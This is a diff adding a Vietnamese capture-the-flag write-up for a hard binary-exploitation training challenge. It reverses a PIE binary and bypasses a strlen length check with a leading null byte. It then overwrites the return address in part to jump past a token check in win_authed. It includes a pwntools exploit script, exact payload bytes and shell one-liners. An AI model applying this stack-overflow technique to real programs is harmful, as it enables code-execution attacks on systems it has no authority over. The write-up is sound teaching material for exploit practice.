@@ -1,0 +1,222 @@
+## 📌 [Viettel Training Program] - String Lengths (hard)
+
+- **Category:** Binary Exploitation (Pwn)
+- **Difficulty:** Hard
+- **Points:** —
+- **Description:** Cùng ý tưởng với bản easy — `strlen()` kiểm tra độ dài input, `memcpy()` copy theo số byte thực tế — nhưng **không in offset, dump stack, hay source**. Stack layout và địa chỉ có thể khác. Binary: `binary-exploitation-null-write`.
+
+## 1. Khảo sát Ban đầu (Mitigation Check)
+
+> Bước này giúp xác định các "lớp giáp" của file binary để biết phương pháp tấn công nào khả thi.
+
+```bash
+$ checksec ./binary-exploitation-null-write
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+```
+
+**Nhận xét nhanh:**
+
+- **Không Stack Canary** → Có thể ghi đè return address.
+- **NX enabled** → Không cần shellcode.
+- **PIE enabled** → Địa chỉ code bị random. Cần **partial overwrite**.
+- **Không có output debug** (khác easy) → Offset và địa chỉ phải tự tìm bằng disassembly.
+
+**So với bản easy:**
+
+| | Easy (`-w`) | Hard |
+|---|-------------|------|
+| Binary | `binary-exploitation-null-write-w` | `binary-exploitation-null-write` |
+| Source | Có source | **Chỉ binary** |
+| In offset / dump stack | Có | **Không** |
+| Cơ chế strlen → memcpy | Có | **Có** |
+| Kích thước input | 37 byte | **63 byte** |
+| Offset → return address | 88 | **104** |
+| `win_authed` offset | `0x1c29` | **`0x22c6`** |
+| Target (sau token check) | `0x1c45` | **`0x22e2`** |
+| Partial overwrite | `\x45\x1c` | **`\xe2\x22`** |
+
+## 2. Phân tích Tĩnh & Động (Reversing & Analysis)
+
+### Phân tích tĩnh (objdump / Ghidra)
+
+Disassembly hàm `challenge()`:
+
+```asm
+add    $0xffffffffffffff80, %rsp   ; sub $0x80 → 128 byte stack frame
+
+; Khởi tạo input (63 byte)
+movq   $0x0, -0x60(%rbp)    ; input[0..7]
+movq   $0x0, -0x58(%rbp)    ; input[8..15]
+movq   $0x0, -0x50(%rbp)    ; input[16..23]
+movq   $0x0, -0x48(%rbp)    ; input[24..31]
+movq   $0x0, -0x40(%rbp)    ; input[32..39]
+movq   $0x0, -0x38(%rbp)    ; input[40..47]
+movq   $0x0, -0x30(%rbp)    ; input[48..55]
+movl   $0x0, -0x28(%rbp)    ; input[56..59]
+movw   $0x0, -0x24(%rbp)    ; input[60..61]
+movb   $0x0, -0x22(%rbp)    ; input[62]
+movq   $0x0, -0x8(%rbp)     ; size = 0
+
+; size = 4096
+movq   $0x1000, -0x8(%rbp)
+
+; tmp_input = malloc(size)
+mov    -0x8(%rbp), %rax
+mov    %rax, %rdi
+call   malloc@plt
+mov    %rax, -0x10(%rbp)
+
+; read(0, tmp_input, size)
+mov    -0x8(%rbp), %rdx
+mov    -0x10(%rbp), %rax
+mov    %rax, %rsi
+xor    %edi, %edi
+call   read@plt
+
+; strlen(tmp_input) → assert(string_length < 63)
+; memcpy(&data.input, tmp_input, received) — copy theo received, ko phải strlen
+```
+
+Hàm `win_authed()` tại offset `0x22c6`:
+
+```asm
+22c6: endbr64
+...
+22d5: cmpl   $0x1337, -0x4(%rbp)    ; if (token != 0x1337)
+22dc: jne    23e0 <win_authed+0x11a> ; → return
+22e2: lea    0xd1f(%rip), %rdi       ; "You win!..."  ← target
+```
+
+Địa chỉ sau token check: **`0x22e2`** (offset trong binary).
+
+### Tính offset từ disassembly
+
+- Buffer bắt đầu tại `rbp-0x60`
+- Return address (saved RIP) tại `rbp+8`
+- Offset: `0x60 + 8 = 0x68 = 104` bytes
+
+| Thành phần | Vị trí stack | Offset từ `input` |
+|------------|--------------|-------------------|
+| `input[63]` | `rbp-0x60` … `rbp-0x21` | 0 – 62 |
+| `tmp_input` | `rbp-0x10` | 80 – 87 |
+| `size` | `rbp-0x8` | 88 – 95 |
+| Saved RBP | `rbp+0` | 96 – 103 |
+| **Saved return address** | **`rbp+8`** | **104 – 111** |
+
+### Phân tích động (GDB / pwndbg)
+
+```text
+$ gdb ./binary-exploitation-null-write
+pwndbg> break *challenge+0x11c    # sau lệnh memcpy
+pwndbg> run
+Send your payload (up to 4096 bytes)!
+pwndbg> cyclic 120
+pwndbg> continue
+pwndbg> cyclic -l $rsp
+[*] Found offset of 104
+```
+
+Hoặc chạy thử với payload bypass:
+
+```bash
+python3 -c '
+import sys
+payload = b"\x00" + b"A" * 103 + b"\xe2\x22"
+sys.stdout.buffer.write(payload)
+' | ./binary-exploitation-null-write
+```
+
+Output:
+```
+Send your payload (up to 4096 bytes)!
+Checking length of received string...
+Passed! We should have enough space for all 0 bytes of it on the stack. Copying all 106 received bytes!
+...
+Goodbye!
+You win! Here is your flag:
+```
+
+=> **Offset tới return address = 104 bytes.**
+
+## 3. Ý tưởng Tấn công (Exploit Strategy)
+
+Giống bản easy — **null byte poisoning** + **partial overwrite**:
+
+1. **Bypass strlen:** Đặt `\x00` làm byte đầu → `strlen()` trả về 0 < 63 → pass assert.
+2. **Overflow:** `\x00` + padding đến offset 104 + 2 byte partial overwrite (`\xe2\x22`).
+3. `memcpy()` copy toàn bộ `received` bytes → ghi đè return address.
+4. Khi `challenge()` return, nhảy vào `win_authed()` sau token check → in flag.
+
+## 4. Mã Khai thác (Exploit Script)
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+context.arch = "amd64"
+context.log_level = "info"
+
+# exe = ELF("./binary-exploitation-null-write")
+# r = process("./binary-exploitation-null-write")
+r = remote("HOST", PORT)  # thay HOST/PORT khi deploy remote
+
+OFFSET_RIP = 104        # offset từ input tới return address (hard)
+WIN_SKIP = 0x22e2       # win_authed+0x1c (sau token check)
+
+# \x00 byte đầu để bypass strlen, sau đó padding + partial overwrite
+payload = b"\x00"                     # strlen() → 0 (pass assert)
+payload += b"A" * (OFFSET_RIP - 1)   # padding tới return address
+payload += p16(WIN_SKIP)              # partial overwrite — 2 byte thấp
+
+r.sendafter(b"Send your payload", payload)
+
+r.interactive()
+```
+
+Payload tối thiểu (local):
+
+```python
+from pwn import *
+r = process("./binary-exploitation-null-write")
+payload = b"\x00" + b"A" * 103 + b"\xe2\x22"
+r.sendafter(b"Send your payload", payload)
+r.interactive()
+```
+
+Hoặc không dùng pwntools:
+
+```bash
+python3 -c '
+import sys
+payload = b"\x00" + b"A" * 103 + b"\xe2\x22"
+sys.stdout.buffer.write(payload)
+' | ./binary-exploitation-null-write
+```
+
+## 5. Kết quả & Flag
+
+Chạy exploit trên môi trường challenge:
+
+```text
+Send your payload (up to 4096 bytes)!
+Checking length of received string...
+Passed! We should have enough space for all 0 bytes of it on the stack. Copying all 106 received bytes!
+...
+Goodbye!
+You win! Here is your flag:
+pwn.college{sOMeFl4gHeRe_f0r_Str1ng_L3n_H4rd}
+```
+
+*(Local không có `/flag` sẽ thấy lỗi mở file — vẫn chứng minh `win_authed()` đã được gọi.)*
+
+**Lessons Learned (Bài học rút ra):**
+
+- Bản **hard** thay đổi **cả offset lẫn địa chỉ**: offset 104 (≠ 88), target `0x22e2` (≠ `0x1c45`).
+- Cơ chế **strlen → memcpy** giống easy: `\x00` byte đầu bypass strlen, memcpy copy full payload.
+- Phải dùng **disassembly** để tìm offset buffer (`rbp-0x60` → `rbp+8`) và target address.
+- **Partial overwrite** vẫn cần thiết vì PIE enabled.
+- Không copy mù quáng thông số từ bản easy — luôn kiểm tra lại bằng reverse engineering.
